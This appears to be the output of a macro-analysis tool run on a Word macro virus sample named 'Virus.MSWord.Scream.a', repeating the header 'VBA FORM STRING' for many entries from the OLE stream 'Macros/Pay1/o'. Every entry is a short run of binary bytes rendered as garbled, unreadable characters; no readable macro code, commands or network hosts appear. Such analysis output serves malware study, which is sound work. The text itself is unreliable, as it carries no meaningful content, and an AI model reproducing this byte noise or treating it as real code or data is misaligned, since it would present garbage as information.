N\|�$�`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�񽻤<��^^/6�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
湷h��_�2�[�^�ŏqs	��1�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��,)-��M!DH�S(ϋv?�LͶUE l��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C�J���F���-ˢ-���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��� r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SZ�Ǒ�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

G�!�ٳd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e�]�`tp�U������8��� �G�O/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u���l�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o���ٕ-<�7�����4So��d�H�z�=�[]]��UAT��G!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<Dq]M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�l�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���-:�CXu=+#���T�n�<Do
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�SRI�q����b��q�aH�撹iK��*�q�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
��Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<�`#x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z`���x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\O�Y{(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�0Hw$i<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*Y+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���x�;qޡ;Q��RY�m+�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)q��t��{w�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z�)i�$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tK4q�Ҏj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)�ik��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R5;�I�]V��}�٢c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"C�^���[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,u[R|�~�H�s�ׯ�?���_F=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R$}���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z��> }�j�V��z��> }�j�D4ߐ�����U��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K]�T���WB�ÓÎ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&��#N���|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
؜]����Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R?��ᦖ��G,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?y̕��w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

	��zF�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FTF�C��+,=�d�vq��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�I7���,v~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F7��)Du�8�`{�dc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ET�7.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�c�HX[�W�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*"�zZ��Zx�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�S5Υ����ֽ�nB��v�r�W�W��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����<i$�@��b楢`�3L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~��Ai��S^�����N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Obp�<�Q��>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0\ݴ�O]r��ɥs��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
1X���B-w��o7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�c�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<�<�{��#��\�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ºV ��$ZF�C<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��O~븍氐~�'��Gp�q{Dr�״p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӥߤ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,uK�0~x�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�A�R��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G֚S��{j$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=����ー��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&#̭
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�*{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5&�_U�W��	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:F��.q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e,b-�r	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�@����FF��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a1��F@i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߨj���3�4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�驞F�nw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aW���Is��x�e�����s��4�8eư����Ҭݖ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bjIH�"q���RN7�xN�2��6�K��K}m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��P7C���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uü*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\l���s�*�j�g8�GQ;a{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q/!��|�t-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʞ9(�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
�ڽL���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FBH6���SW(�iH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�*RA�C�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӌ�ԦT���.����}�)\5na�k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jɲ�_r �@(#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#>f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V6�ж� �W�W>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7ck��O�-V�u5��B��^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����I$��#��CL,�:�U����WoJx�{�b���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)�J�j#p8	=Ң
jc����f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cRꊼ��
>��gt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ғ&$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�l~��cر�mI����"�ϳ^���[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,u[R|�~�H����tG�~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;m�F����Q��[{m�F����Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~BV����l�WF�AZМ� ���`I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ki���!,|Gh�*�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɀy�@�d�~F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�FW��l6�A%A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SL�́���x'�>i�6�Tޣ����sݺ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ce���T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji�dV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E5��ۥ�/�@9�d����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DSY[�Gu/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a[�l �%L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!B��4#mER:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S���뛍�.r�6��V��]h�5�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?���]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0�]�4aU�J�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J�	�?��'i�,��fԳY��c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8�V�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ga#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ն
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lFz)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��88�Yxw5{��"v�]tR��kÇ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:��� �ܧ�iye�K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�q��g��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cx�\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.ъ@���JF��3ˀkd�̞�8vq�$�&i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tR��{\C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|"7�=�!�Eʙ�v�skF�NlS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�~�3��,��

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�պ���u,��7<K�&�ē�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4q���d�'�u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���:8${�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Pc��� #���0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǵǼ��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���*f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e���#]GF�8�#��.'Մٜ
-------------------------------------------------------------------------------
